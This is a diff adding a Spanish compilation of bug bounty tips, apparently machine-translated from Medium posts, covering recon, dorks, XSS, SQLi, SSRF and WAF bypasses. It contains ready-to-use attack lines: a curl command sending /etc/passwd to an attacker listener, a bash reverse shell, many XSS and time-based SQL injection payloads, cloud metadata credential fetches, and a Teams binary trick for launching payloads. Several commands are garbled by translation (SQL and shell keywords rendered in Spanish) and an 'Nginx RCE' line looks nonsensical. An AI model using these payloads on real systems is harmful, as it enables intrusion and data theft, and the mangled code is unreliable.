@@ -1,0 +1,327 @@
+
+Consejos y trucos:
+https://bbinfosec.medium.com/collection-of-bug-bounty-tip-will-be-updated-daily-605911cfa248
+
+1) Ejecute un sitio de Google dork: “ http://amazonaws.com ” la marca le ayudará a encontrar los buckets S3 y algunos LB para ayudar a encontrar la IP real
+
+2) Intenta volver a https://storage.googleapis.com/Org-name-here; es posible que encuentres documentación interna que no se supone que sea pública.
+
+3) Si recibió un ataque de 'Toma de subdominio', no lo informe todavía, mire el sitio/aplicación principal para obtener privilegios: como una posible evasión de la política de CSP (o secuestro de sesión mediante Set-cookie: *.domain.com)
+
+4) Siempre use fuerza bruta en http://subdomain.corp.website.com y *.dev.*
+
+5) Busque el puerto 9200 (búsqueda elástica) y encuentre información interesante. Use shodan.io con la consulta org: "nombre de la organización".
+
+6) Se encontró un bucket s3 detrás del CDN. Cámbielo a https y podría aparecer.
+
+7) Busque tableros públicos de Trello de empresas, para encontrar credenciales de inicio de sesión, claves API, etc. o si no tiene suficiente suerte, puede encontrar tableros de equipo de empresas a veces con tareas para corregir vulnerabilidades de seguridad.
+
+8) Recuerda que Github es tu amigo: revisa los archivos de puntos de los empleados de la empresa. Busca proyectos DevOps compartidos (bifurcación) entre empleados (ansible, Cassandra, Azure, etc.) => obtienes credenciales de inicio de sesión, clave API y claves privadas. Sigue siempre el enfoque manual.
+
+9) Utilice https://cse.google.com/cse/all y cree una búsqueda personalizada para * http://target.com . Funciona bien para objetivos con gran alcance.
+
+10) RCE a ciegas: toma /etc/passwd y lo envía a su oyente netcat mediante POST `cat /etc/passwd | curl -X POST -d @- http://yourip:yourport/`
+
+11) RCE a ciegas: ¡conviértalo en un shell inverso! |`bash -i >& /dev/tcp/yourip/yourport 0>&1`
+
+12) Carga útil de Sometimex xss: <sVg/oNloAd=”JaVaScRiPt:/**\/*\'/”\eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))”> <iframe src=jaVaScrIpT:eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))>
+
+13) Si el objetivo usa @Cloudflare , revisa sus registros DNS y busca la dirección IP de origen. Si atacas la aplicación directamente desde su IP, el WAF de Cloudflare no estará presente.
+
+14) Busca desarrolladores de la organización (Linkedin, http://hunter.io , etc.) y usa su nombre en GitHub. Busca repositorios que sean públicos, pero no deberían serlo.
+
+15) Si te encuentras con una solicitud que tiene diferentes acciones, por ejemplo: example[dot]com/someendpoint?type=search&query=test, prueba siempre acciones diferentes como `type=users`, `type= accounts`, `type=details`, podrías llevarte algunas buenas sorpresas ;)
+
+16) Busque campos de entrada ocultos (y visibles) e intente establecer el valor a través de GET… muchas aplicaciones web aún usan $_REQUEST… se sorprenderá ;) si tiene un valor reflejado -> verifique la inyección de html/script ;)
+
+17) Use commoncrawl para encontrar subdominios y endpoints. A veces encontrará endpoints que no se pueden acceder directamente desde la interfaz de usuario, pero que han sido indexados desde otros sitios: curl -sX GET “ http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$1&output=json …” | jq -r .url | sort -u
+
+18) Subir un archivo con .url puede resultar en XSS :) Chrome aún no lo admite, pero funciona de maravillas con FOX
+
+19) A veces encuentras esas RUTAS que reenvían a una página de inicio de sesión y no puedes ver el contenido dentro de ellas. (ej: /path/to/secret → inicio de sesión de Google) Toma todas estas RUTAS, antepone /public/ a todas ellas como: /public/path/to/secret , obtuve acceso a una instancia de Jenkins.. [1]
+
+20) Si el servidor solo permite los métodos GET y POST, intente agregar “X-HTTP-Method -Override: PUT para lograr RCE a través del método PUT
+
+21) ¿Encontraste un punto final que realiza alguna acción con imágenes? Prueba esto: request=input&&id, request=input|id, request=input`id` o incluso puedes configurar un NC y probar request=input&& http://wgetyourserver.com :port, etc.
+
+22) ¿Quieres encontrar el código interno de empresas o ejemplos de códigos de nuevas funciones? Consúltalo en: sitio: http://repl.it intext:<dominioempresa>. En el dominioempresa, si conoces el dominio interno, es aún mejor.
+
+23) Si un sitio web no verifica el correo electrónico, intenta registrarte con <whatev> @ dominio.com (el correo electrónico de la empresa). A veces, esto te otorga mayores privilegios, como eliminar o ver los perfiles de otros usuarios, etc.
+
+24) Si encuentra un LFI, ignore /etc/passwd y vaya a /var/run/secrets/kubernetes.io/serviceaccount, esto aumentará la gravedad cuando les entregue un token o certificado de Kubernetes.
+
+25) dentro de un #contenedor / #pod que no tiene wget/curl? prueba busybox…busybox wget -q -O — http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+
+26) Si ha encontrado un servidor ( http://foo.company.com ) que lo redirecciona inmediatamente a http://bar.company.com , siempre ejecute la enumeración de recursos (dirb, wfuzz, etc.) contra http://foo.company.com A veces puede encontrar algo "oculto".
+
+27) ¿Ves un punto final de API que muestra datos confidenciales? Agrega un parámetro jsonp o de devolución de llamada e intenta filtrarlo usando XSS
+
+28)Es posible omitir #CSP con lo siguiente: #JSONP: <script src=” https://trustedsite/jsonp?callback=payload "> #AngularJS <script src=” https://trustedsite/angularjs/1.1.3/angularjs.min.js "> <div ng-app ng-csp id=p ng-click=$event.view.alert(1)>
+
+29) Carga útil simple para postgresql, fácil 2000$ :) 1 Y 1=(seleccionar 1 de PG_SLEEP(10)) — ' Y 1=(seleccionar 1 de PG_SLEEP(10)) O '1'='
+
+30)Carga útil simple para postgreesql 1 AND 1=(seleccionar 1 de PG_SLEEP(10)) — ' AND 1=(seleccionar 1 de PG_SLEEP(10)) OR '1'='
+
+31) Alertas de XSS en buckets S3 en el dominio S3. Es un error de baja prioridad. Es mejor buscar un XSS reflejado en el dominio principal y crear un iframe en XSS S3. Podrías obtener el control de la cuenta.
+
+32)Es posible ejecutar “#OS #Command #Injection” en lugar de #XSS en Filename.PDF?parameter=PAYLOAD+|+Dir+c:\
+
+33) Intenta cambiar el protocolo para evitar la protección de redirección abierta. http://example.com -> ftp://example.com Puede que tengas suerte.
+
+34) Puedes convertir un cuadro de entrada en XSS automático configurando una carga útil independiente en el atributo "onfocus" y luego estableciéndolo en "autofocus". Por ejemplo: <input onfocus="alert(0);" autofocus> Esto generará XSS automático (sin interacción del usuario).
+
+35) En caso de que quieras probar una SSRF pero no tienes un VPS y el colaborador de Burp está bloqueado, puedes usar esto https://canarytokens.org/generate #bugbounty
+
+36) Cambia el agente de usuario a tu carga útil XSS ciega y explora el sitio. Por ejemplo, visita enlaces, completa formularios, etc. A veces, con suerte, se activa el XSS ciega.
+
+37) Cuando el controlador de protocolo de archivos no funciona, a veces Netdoc puede ser tu aliado. Solo lo digo :)
+
+38) ¿Te has encontrado con AWS WAF? Simplemente añade "<!" (sin comillas) antes de tu carga útil y omite ese WAF. :) Por ejemplo: <!<script>alert(1)</script>
+
+39) Existe una buena posibilidad de detectar puntos finales modificados, incompletos o incluso rotos en entornos inferiores, como subdominios como #qa #uat #dev #dr #staging #stage #test #sandbox #www2.
+
+40)Encontré Tomcat en Windows https://xxxx/.//WEB-INF/web.xml -> 200 OK
+
+41) Si el sitio web tiene un token CSRF o alguna clave secreta en la respuesta, intente solucionar el problema de configuración incorrecta de CORS. Puede robar tokens secretos.
+
+42) Obtenga un alcance más amplio al usar el mismo dork en múltiples motores de búsqueda, por ejemplo, inurl:”/reports/rwservlet/” para obtener informes de Oracle que son propensos a XSS (CVE-2019–2413) y producen resultados significativamente diferentes en Google y Bing.
+
+43)Recopilar subdominios con expresiones regulares BurpPro -> buscar -> escribir (\w+)?\.? http://domain.com Exp regular: (\w+)?\.? http://domain.com Inténtalo y recopilarás con subdominios puntos finales muy interesantes.
+
+44) En una prueba en la nube, si encuentras un archivo .cspkg, es una mina de oro, es un archivo zip con todo el código compilado y los archivos de configuración.
+
+45) Una sola carga útil # RCE los gobierna a todos, fácil 6000$ ;) 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}”;sleep${IFS}9;#${IFS}
+
+46) No te limites a mirar las versiones más recientes de las aplicaciones. A veces puedes obtener claves API de aplicaciones antiguas que aún funcionan.
+
+47) Y analizar las aplicaciones de ambas formas (estática y dinámicamente) para aumentar las posibilidades de que se produzcan errores.
+
+48) Omisión de Cloudflare: <a href="j a v asc ri pt:\u0061\u006C\u0065\u0072\u0074(this['document']['cookie'])">X</a>
+
+49) Si obtiene un shell en una máquina con ~/.aws/credentials, continúe con la evaluación del bucket o las instancias de EC2. Comandos: aws s3 ls s3://XXX/directory/ — nombre de usuario del perfil y aws ec2 describe-instances — nombre de usuario del perfil.
+
+50) nmap — script “http-*” IP/destino — Ejecutará más de 30 scripts relacionados con http. Desde inyección SQL hasta copias de seguridad de la configuración. Consulte más información en la documentación.
+
+51) Siempre realiza ataques de fuerza bruta en todos los subdominios, incluso en páginas de error 403. A veces, obtendrás un archivo .git y podrás descargar el código fuente completo de la aplicación web.
+
+52) La deserialización es realmente efectiva. Nunca subestime la falta de estándares de la industria implementados en hashes y otras cadenas cifradas utilizadas por aplicaciones web.
+
+53) ¿Tienes una SSRF? ¿No hay puntos finales de metadatos que alcanzar? Prueba https://kubernetes.default.svc/metrics. Si obtienes un error de carga, regresa a la carga máxima; has alcanzado la API de Kubernetes, lo que debería indicar que cualquier equipo de seguridad debería irse a dormir. (La URL puede cambiar).
+
+54) Aquí está mi carga útil ofuscada. Evita muchos WAF, incluyendo CloudFlare, si no recuerdo mal. <iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”> iFrame con carga útil de URI de JavaScript. Los saltos de línea [CRLF] la ofuscan.
+
+55) ¿Encontraste una empresa con un sistema de código abierto y no encuentras un CVE? Descarga y configura el sistema tú mismo y observa dónde fallas. Lo más probable es que encuentres alguna configuración errónea común y fácil de pasar por alto que cometió el administrador.
+
+56) Al inyectar en atributos src, se necesita una carga útil de URI de JavaScript. Aquí hay una buena carga útil que creé usando varios saltos de línea para evitar WAF: %0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0) Funciona con enlace + iframe.
+
+57)Muchos sitios inician sesión con el usuario después de restablecer la contraseña a través de algún token, en algunos casos puede omitir 2FA solo restableciendo su contraseña, si tiene suerte, después de eso su cuenta iniciará sesión sin necesidad de confirmar nada más.
+
+58) La carga útil se ejecutará en muchos contextos. javascript:”/*'/*`/* →<html \” onmouseover=/*<svg/*/onload=alert()//> Corto pero letal. Sin etiquetas de script, lo que evita muchos WAF y se ejecuta en múltiples entornos.
+
+59) Siempre busque parámetros que se reflejen en las funciones de JavaScript, como en una variable. Si no hay codificación URL para caracteres como ; ) }, puede cerrar esa función para insertar su JavaScript malicioso. Por ejemplo, ;)}alert(1)/
+
+60) a través de la búsqueda de burpsuite para encontrar alguna redirección abierta, busque “=http” o “=aHR0” (codificación http en base64) en el “Encabezado de solicitud” y el código de estado 30X, también puede usar este consejo para encontrar alguna SSRF.
+
+61) Para obtener una página de error o un seguimiento de pila en una aplicación basada en ASP, puede probar los siguientes directorios: 1. /con/ 2. /aux/ 3. con.aspx 4. aux.aspx
+
+62) A veces, la entrada del usuario se refleja en un valor sin comillas. Por ejemplo: <input value={input}> ¡Solo añade un espacio y ya puedes inyectar el autoenfoque onfocus=alert(0) para XSS! Funciona incluso con htmlspecialchars().
+
+63) Para encontrar dominios y subdominios vulnerables que actualmente apuntan a GitHub debido a una configuración incorrecta, intente buscar la sintaxis ff en publicwww. "No hay un sitio de páginas de GitHub aquí". Devolverá miles de páginas con dominios y subdominios que podrían ser vulnerables a una toma de control.
+
+64) Aquí tienes un buen consejo sobre errores de SSRF si estás en Heroku: 1) Intenta llamar a /app/Procfile para obtener las instrucciones de instalación que un desarrollador recibió al implementar en Heroku. 2) Si carga correctamente y sabes qué pila usa, deberías poder encontrar el código fuente de la aplicación en el directorio /app. Por ejemplo, si se trata de Rails, puedes obtener el archivo route.rb llamando a /app/config/routes.rb. La carpeta de la aplicación es el directorio principal donde se almacena todo el código implementado.
+
+65) Agregue al alcance todos sus subdominios de destino en la pestaña “Objetivo” de @ Burp_Suite >> “Alcance” >> casilla de verificación “Usar control de alcance avanzado” >> botón “Agregar” >> Establecer protocolo: Cualquiera — Rango de host/IP: .*\.domain\.com$ >>
+
+66) Algunas instancias de AEM pueden responder de manera diferente a distintos navegadores. Por ejemplo, https://website/apps/..tidy.3....json/t.js en Chrome devolverá HTTP 200 mientras que Firefox devolverá HTTP 404.
+
+67) Puerto 50070 hadoop Sin autenticación Acceso a registros y acceso de lectura y escritura a directorios
+
+68) Búsqueda de puntos finales mientras se buscan errores en las opciones para desarrolladores. Puede ser útil presionar Ctrl+Shift+J, hacer clic en la red y recargar la página, algunos puntos finales, URL y también puede encontrar el subdominio.
+
+69) Un ejemplo de la importancia de supervisar la actualización de los certificados SSL: La semana pasada obtuve una lista de subdominios únicos de una empresa a partir del conjunto de datos de marzo. Ahora, en comparación con el conjunto de datos de mayo, se agregaron 2000 subdominios únicos. Su reconocimiento no es eficaz si no está actualizado.
+
+70) ¿Necesitas copiar la salida de la terminal al portapapeles en X11? Instalar xclip: apt-get install xclip setup bash alias: alias xclip='xclip -selection c' profit: egrep 'interesting' <corpus> | xclip (¿OSX? ¡Consulta pbcopy/pbpaste!)
+
+71) ¿Alguna vez te has encontrado con una instancia de Grafana mientras realizas una auditoría? A veces puedes omitir el inicio de sesión único (SSO) de la empresa (cuando solo se muestra el inicio de sesión) yendo directamente a "/signup" y registrándote con tus propias credenciales (o prueba con el administrador predeterminado:admin).
+
+72) Si encuentra una clave API de Google Maps, intente usarla aquí: https://developers.google.com/maps/documentation/maps-static/intro… Esto podría ocasionar pérdidas financieras a una empresa.
+
+73) Intenta siempre incluir un % rápido en los campos de búsqueda, etc. :). Podría terminar en una declaración LIKE y devolver todo :)
+
+74) Deshabilitar la fijación SSL de Android usando Objection+Frida pip3 install -U objection (Descargar frida-server, enviar a /data/local/tmp en el dispositivo rooteado e iniciarlo usando adb shell). objection — gadget “ http://com.target.app ” explorar android sslpinning deshabilitar
+
+75) Al realizar fuzzing en puntos finales, recuerde realizar fuzzing autenticado: dirsearch, wfuzz y ffuf admiten encabezados de usuario; ¡haga buen uso de ellos y proporcione sus cookies de autenticación!
+
+76) Si desea colocar espacios en un comando: #<!ENTITY xxe SYSTEM “expect://ls$IFS-la$IFS/”>]>
+
+77) Omisión de Captcha: -El Captcha se generó en base a una cadena MD5 dada. ¡Escribí un bot para generar aleatoriamente un MD5 de una cadena de 6 caracteres y usarlo como Captcha para iniciar sesión!
+
+78) Omitir firewall personalizado con técnica de codificación de URL: Carga útil final: %253%63svg%2520onload=alert(1)%253%65 el firewall estaba bloqueando “%253c”, Truco: %25 3 %63 -> cuando la aplicación lo decodificó, se convirtió en %3c -> la aplicación lo decodificó nuevamente y se convirtió en < y recibió una alerta
+
+79) ¿Tiene un límite de caracteres para XSS? Compruebe si se adjunta con otros campos (nombre + apellido). Luego puede dividir las cargas útiles (en este caso, se necesitó JQuery para cargar el script de extensión): Nombre: “><svg/onload=“$.getScript('http://'+ Apellido: ' http://evil.com ')
+
+80) ¿Quieres automatizar la enumeración de usuarios de sitios de WordPress en todos los subdominios y luego usar la fuerza bruta para identificar a los usuarios? read file; amass enum -o subdomains.txt -d $ file ; cat subdomains.txt | while read url; do wpscan — url https://”$url” -P passwords.txt -t 50 -o output/”$url”.txt;
+
+81) OneLiner extrae todos los puntos finales de API de los archivos AngularJS y JavaScript de Angular: curl -s URL | grep -Po “(\/)((?:[a-zA-Z\-_\:\.0–9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0–9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0–9\{\}]+))” | sort -u
+
+82) ¡Una línea para obtener recursos de rastreo comunes!
+
+curl -sL http://index.commoncrawl.org | grep 'href="/CC" | awk -F'"' '{imprimir $2}' | xargs -n1 -I{} curl -sL http://index.commoncrawl.org {}-index?url= http://url/ * | awk -F'"url":\ "' '{imprimir $2}' | cortar -d'"' -f1 | ordenar -u | tee dominio.txt
+
+83) Copie su carga útil en %userprofile%\AppData\Local\Microsoft\Teams\current\ Luego %userprofile%\AppData\Local\Microsoft\Teams\Update.exe — processStart payload.exe — process-start-args “cualquier argumento” El binario firmado confiable ejecutará la carga útil por usted
+
+84) Desbordamiento de RCE de Nginx: curl -gsS https://victim.server.here:443/../../../%00/nginx-handler?/usr/lib/nginx/modules/ngx_stream_module.so:127.0.0.1:80:/bin/sh%00victim.server.here/../../../%00/n … \<'protocol:TCP' -O 0x0238f06a#PLToffset |sh; nc /dev/tcp/localhost
+
+85) Pruebe SQLi + XSS + SSTI con el mismo uso de carga útil
+
+
+SQLI+XSS+SSTI
+86) Las redirecciones abiertas se pueden escalar en ocasiones:
+
+Redirección abierta + Aplicación OAuth mal configurada => Robo de token OAuth
+Redirección abierta + SSRF filtrado => SSRF
+Abrir redirección + CRLFi => XSS
+Abrir redirección + URI javascript => XSS
+87) “site:*.domain.com ext:html” es un buen buscador de Google para encontrar páginas HTML estáticas antiguas que ya no tienen vínculos y que podrían contener JS con errores que podrían generar XSS.
+
+88) Omisión de XSS de Cloudflare WAF: <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+
+Carga útil 2: <select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
+
+carga útil 3: <a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
+
+89) Si está probando el acceso a los buckets S3 y no desea configurar credenciales para la prueba, utilice — no-sign-request. 'aws s3 command S3://bucket/file — no-sign-request'
+
+90) puedes usar esta herramienta para generar dinámicamente tus propias cargas útiles de seguridad (XSS, SQLI, formato de correo electrónico, etc.) para pruebas fuzz: (enlace: https://gitlab.com/akihe/radamsa) gitlab.com/akihe/radamsa ejemplo: echo “<script>alert(1)</script>” | radamsa -n 5 — patrones de
+
+91) Carga útil de SQL WAF-Fail2Ban mediante punto
+
+(SELECCIONAR 6037 DE(SELECCIONAR CONTAR(*),CONCAT(0x7176706b71,(SELECCIONAR (ELT(6037=6037,1))),0x717a717671,FLOOR(RAND(0)*2))x DE INFORMACIÓN_ESQUEMA.PLUGINS AGRUPAR POR x)a)
+
+92) Al acceder al sitio sin iniciar sesión en su cuenta, obtendrá algunos puntos finales ocultos que otros pasan por alto.
+
+93) ¡Olvídese de los subdominios para el reconocimiento! Vaya directamente al ASN y llegue a la organización del rango de red: Surge un nuevo mundo sin WAF, muchos certificados SSL desordenados, hosts desprotegidos y servidores privados ocultos.
+
+94) Si tu objetivo requiere verificación de número de teléfono y necesitas más cuentas, puedes comprar una tarjeta SIM prepaga realmente barata y, sin recargarla, ¡podrás recibir los códigos de verificación en SMS!
+
+95) Obtenga sus rangos de IP de destino usando su dominio de destino (extracción asn+cidr): a=$(curl -H'Accept: application/json' http://api.iptoasn.com/v1/as/ip/ $(dig +short $domain | head -1)| jq .as_number);echo '!gas'$a''| nc http://whois.radb.net 43 | tr “ “ “\n” | sed -e '1d' -e '$d'
+
+96) Mientras todos buscan buckets S3 abiertos, use cloud_enum para encontrar cuentas de almacenamiento abiertas de Google Cloud y Microsoft Azure.
+
+97) Si encuentra alguna clave API, utilice esta para abusar y obtener la máxima recompensa: https://github.com/streaak/keyhacks
+
+98) Algunas hojas de trucos de Burp Suite aquí: https://www.sans.org/security-resources/posters/burp-suite-cheat-sheet/280/download
+
+99)Alguna explicación sobre la recompensa por errores que no te puedes perder: https://www.youtube.com/c/BugBountyReportsExplained
+
+100) Impresionante colección de consejos relacionados con bugbounty en gitbook: https://gowsundar.gitbook.io/book-of-bugbounty-tips/
+
+
+
+
+
+
+
+
+
+Consejos profesionales de Bug Bounty:
+https://infosecsanyam.medium.com/bug-bounty-methodology-ttp-tactics-techniques-and-procedures-v-2-0-2ccd9d7eb2e2
+
+Consejo profesional: Las aplicaciones Android pueden verse afectadas por LFI y XSS almacenado simplemente al inyectar <iframe/src=/etc/hosts> en los campos de entrada. ¡Pago: $4,500! por xer0dayz
+Consejo para encontrar SSRF de @roughwire
+Consejo de @jmelika para #bugbounty : Para demostrar el impacto de XSS, no uses alert('alert'). Determina si la sesión se almacena en cookies o en el almacenamiento local e inclúyelo en la ventana emergente. cookie: alert(document.cookie) LocalStorage: alert(localStorage.getItem('access_token'))
+Consejo de #bugbounty de Jake Menaga : Este genial consejo para encontrar paneles de Jenkins en Shodan `http.favicon.hash:81586312`
+Consejo de CSRF de Mikhel: Puedes enviar el encabezado Content-Type entre dominios sin activar CORS. El backend podría interpretar que el tipo de contenido es application/json.
+Por @m0z: Un consejo útil para encontrar vulnerabilidades de divulgación de ruta completa: añadir una matriz ([] o incluso [1,2,3]) a un parámetro. Esto puede generar un error de divulgación de ruta completa.
+Consejo de BugBounty de Prateek Tiwari : Si ha encontrado un IDOR en el que puede cambiar datos de otros, no se levante de su asiento para informarlo. Modifíquelo a la carga útil XSS y, si las entradas no se desinfectan y las variables se repiten sin escaparse, entonces IDOR>XSS>ATO
+Consejo de #Bugbounty : Si desea saber el nombre del bucket s3 interno del sitio, simplemente coloque %c0 en la URL
+Consejo de #Bugbounty: Si el objetivo usa Cloudflare , revisa su registro DNS y busca la dirección IP de origen. Si atacas la aplicación directamente desde su IP, el WAF de Cloudflare no estará presente.
+Consejo de #Bugbounty: Busque instancias de Jira en la consulta @Google: inurl:jira AND intitle:login AND inurl:[nombre de la empresa]
+Consejo de Jason Haddix : ¿Encontraste un error 401/403, una autenticación básica o un dominio que te parece interesante, pero que está bloqueado? Revisa sus entradas en archive.org/web/. A veces, con claves API o una estructura de URL, puedes navegar a la fuerza a contenido desprotegido que aún está ahí.
+Consejo de #Bugboutny de Sri Ram: Al iniciar un programa, usa este dork. site: prog.com inurl:lang= o inurl:locale= La mayoría de las veces recibirás una inyección CRLF allí si se refleja
+Consejo de Emad Shanab : Error de SSRF en UDDI Explore de Oracle Weblogic Server Google dork: inurl:/uddiexplorer
+Consejo de Avinash Jain (@logicbomb_1) para descubrir si se ha implementado un subdominio en Github, se puede usar el siguiente comando de Google: intext: "No hay un sitio de páginas de Github aquí" y intitle: "Sitio no encontrado. Páginas de Github".
+Consejo de @knowledge_2014: Prueba la inyección XSS ciega en el agente de usuario o en los encabezados de origen/referencia. Si la carga útil no parece ejecutarse, vuelve a intentarlo con la codificación de URL o doble codificación. ¡A veces funciona de maravilla!
+Consejo de #Bugbounty de @404death :- Carga útil XSs <svg/onload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;//
+Consejo de #Bugbounty de @SpenGietz: Consejo de #AWS: ¿Sabías que, si bien la mayoría de la API de metadatos de EC2 está deshabilitada en AWS Glue Dev Endpoints, aún puedes recuperar credenciales temporales para el rol adjunto al escribir "http://169.254.168.254/latest/meta-data/iam/security-credentials/dummy"?
+Consejo de @knowledge_2014: Al probar una API REST, la mayoría de las veces verá solicitudes PATCH/PUT/DELETE. Cambie el orden de las solicitudes para ver qué comportamiento muestra la aplicación como salida.
+Consejo de #Bugbounty de @ESec haxor: Un pequeño truco para intentar evitar algunos filtros: use %0D! = <! — */'*/!>%0D<svg/onload=confirm'1'//
+Consejo de Bugbounty: – Encontrar Durpal: inurl:”/user/register” “Desarrollado por Drupal” -CAPTCHA -”Acceso denegado” o inurl:”user/register?element_parents=account/mail” inurl:”*drupal_ajax”
+Consejo de #Bugbounty de @c1h2e1: #BugBounty #BugBountyTips #bugbountytip a través de la búsqueda de burpsuite para encontrar alguna redirección abierta, busque “=http” o “=aHR0” (codificación base64 http) en el “Encabezado de solicitud” y el código de estado 30X. También puede usar este consejo para encontrar alguna SSRF
+Consejo #Bugbounty de Sanyam Chawla : lea una vez el 'Manual del hacker de aplicaciones web', comprenderá los conceptos básicos de la aplicación web, luego será fácil explotar el código.
+Centrarse en la enumeración. La enumeración es clave.
+Consejo de #Bugbounty de Vanshit: omita AWS WAF - // Agregue “<!” (sin comillas) antes de su carga útil y omita ese WAF.
+p. ej.: <!<script>confirm(1)</script>
+Intenta volver a https://storage.googleapis.com/Org-name-here; es posible que encuentres documentación interna que no se supone que sea pública.
+Si recibió un 'Subdomain Takeover', no lo informe todavía, mire el sitio/aplicación principal para obtener privilegios: como una posible evasión de la política de CSP (o secuestro de sesión mediante Set-cookie: *.domain.com)
+Siempre use fuerza bruta en http://subdomain.corp.website.com y *.dev.*
+Busca el puerto 9200 (búsqueda elástica) y encuentra información interesante. Usa shodan.io con la consulta org: "nombre de la organización".
+Se encontró un bucket s3 detrás del CDN. Cámbielo a https y podría aparecer.
+Busque tableros públicos de Trello de empresas para encontrar credenciales de inicio de sesión, claves API, etc. o, si no tiene suerte, puede encontrar tableros de equipo de empresas que a veces contienen tareas para solucionar vulnerabilidades de seguridad.
+Recuerda que Github es tu amigo — Revisa los archivos de puntos de los empleados de la empresa — Busca proyectos DevOps compartidos (bifurcación) entre empleados (ansible, Cassandra, Azure,..) => obtienes credenciales de inicio de sesión, clave API, claves privadas — Sigue siempre el enfoque manual
+Utilice https://cse.google.com/cse/all y cree una búsqueda personalizada para * http://target.com . Funciona bien para objetivos con gran alcance.
+RCE ciego: toma /etc/passwd y lo envía a su oyente netcat mediante POST `cat /etc/passwd | curl -X POST -d @- http://yourip:yourport/`
+RCE ciego: ¡conviértalo en un shell inverso! |`bash -i >& /dev/tcp/yourip/yourport 0>&1`
+Carga útil de Sometimex xss: <sVg/oNloAd=”JaVaScRiPt:/**\/*\'/”\eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))”> <iframe src=jaVaScrIpT:eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))>
+Busque campos de entrada ocultos (y visibles) e intente establecer el valor a través de GET… muchas aplicaciones web aún usan $_REQUEST… se sorprenderá
+Si tiene un valor reflejado -> verifique la inyección de HTML/script
+Si el servidor solo permite los métodos GET y POST, intente agregar “X-HTTP-Method -Override: PUT para lograr RCE a través del método PUT.
+Si ha encontrado un servidor ( http://foo.company.com ) que lo redirecciona inmediatamente a http://bar.company.com , siempre ejecute la enumeración de recursos (dirb, wfuzz, etc.) contra http://foo.company.com A veces puede encontrar algo "oculto".
+Es posible omitir #CSP con lo siguiente: #JSONP: <script src=” https://trustedsite/jsonp?callback=payload “> #AngularJS <script src=” https://trustedsite/angularjs/1.1.3/angularjs.min.js “> <div ng-app ng-csp id=p ng-click=$event.view.alert(1)>
+Alertas de XSS en buckets S3 en el dominio S3. Es un error de baja prioridad. Es mejor buscar un XSS reflejado en el dominio principal y usar un iframe en XSS S3. Podrían robar la cuenta.
+Cambia el agente de usuario a tu carga útil XSS ciega y explora el sitio. Por ejemplo, visita enlaces, completa formularios, etc. A veces, con suerte, se activa el XSS ciego.
+Una sola carga útil # RCE los gobierna a todos, fácil 6000$
+1;dormir${IFS}9;#${IFS}';dormir${IFS}9;#${IFS}”;dormir${IFS}9;#${IFS}
+Si obtiene un shell en una máquina con ~/.aws/credentials, continúe con la evaluación del bucket o las instancias de EC2. Comandos: aws s3 ls s3://XXX/directory/ — nombre de usuario del perfil y aws ec2 describe-instances — nombre de usuario del perfil.
+Aquí está mi carga útil ofuscada. Evita muchos WAF, incluyendo CloudFlare, si no recuerdo mal. <iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”> iFrame con carga útil de URI de JavaScript. Los saltos de línea [CRLF] la ofuscan.
+A veces, la entrada del usuario se refleja en un valor sin comillas. Por ejemplo: <input value={input}> ¡Solo añade un espacio y ya puedes inyectar el autoenfoque onfocus=alert(0) para XSS! Funciona incluso con htmlspecialchars().
+Puerto 50070 hadoop Sin autenticación Acceso a registros y acceso de lectura y escritura a directorios.
+La búsqueda de puntos finales mientras se buscan errores en las opciones para desarrolladores puede ser útil: presione Ctrl+Shift+J, haga clic en la red y vuelva a cargar la página, algunos puntos finales, URL y también puede encontrar el subdominio.
+Si desea colocar espacios en un comando: #<!ENTITY xxe SYSTEM “expect://ls$IFS-la$IFS/”>]>
+Omisión de Captcha: -El Captcha se generó en base a una cadena MD5 dada: ¡escribí un bot para generar aleatoriamente un MD5 de una cadena de 6 caracteres y usarlo como Captcha para iniciar sesión!
+¿Necesitas más consejos sobre Bugbouty? Visita Twitter y busca los siguientes hashtags:
+
+#ConsejosDeRecompensasPorErrores
+Consejos para obtener recompensas por errores
+https://medium.com/@trapp3rhat/metodología-de-caza-de-bugs-parte-3-457eaf9768a5 — (Recopilación de algunos consejos sobre recompensas por errores)
+
+
+
+
+Mis consejos y trucos
+Consejo n.° 1 para la búsqueda de recompensas por errores: lea siempre el código fuente
+Consejo n.° 2 para la búsqueda de recompensas por errores: intenta buscar subdominios
+Consejo n.° 3 para la búsqueda de recompensas por errores: compruebe siempre el CMS y el lenguaje del backend (integrado)
+Consejo n.° 4 para la búsqueda de recompensas por errores: Google Dorks es muy útil
+Consejo n.° 5 para la búsqueda de recompensas por errores: Verifique cada solicitud y respuesta
+Consejo n.° 6 para la búsqueda de recompensas por errores: Mente activa y pensamiento innovador
+Mi metodología para la búsqueda de errores
+Primero revise el alcance
+Realizar reconocimiento para encontrar objetivos válidos
+Encuentre subdominios a través de varias herramientas Sublist3, virus-total, etc.
+Seleccione un objetivo y luego escanee contra los objetivos descubiertos para recopilar información adicional (verifique CMS, servidor y toda otra información que necesito)
+Utilice Google Dorks para recopilar información de un objetivo en particular.
+Revise todos los servicios, puertos y aplicaciones.
+Fuzz para detectar errores y exponer vulnerabilidades
+Atacar vulnerabilidades para crear pruebas de concepto
+
+
+
+Parte — 03 — Enfoque / Informes:
+Esta parte trata sobre seleccionar un objetivo, un enfoque para encontrar los errores y, después de terminar las pruebas, escribir un buen informe.
+
+¿Cómo seleccionar y acercarse a un objetivo?
